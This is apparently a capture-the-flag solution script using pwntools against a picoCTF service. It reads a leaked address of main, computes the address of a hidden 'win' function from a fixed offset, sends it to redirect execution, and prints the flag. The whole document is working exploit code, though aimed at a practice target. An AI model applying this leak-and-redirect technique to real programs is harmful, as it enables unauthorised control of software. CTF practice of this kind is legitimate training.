#!/usr/bin/env python3
from pwn import *
context.log_level = 'error'

# Connect to the remote service
p = remote("rescued-float.picoctf.net", 62959)

# Extract the leaked main address
p.recvuntil(b"Address of main: ")
leaked_main = int(p.recvline().strip(), 16)

# Calculate win address (win_offset - main_offset = -0x96)
win_address = leaked_main - 0x96

# Send the payload
p.sendline(hex(win_address).encode())
p.recvuntil(b"won!")

# Receive the flag
print(p.recvall().decode())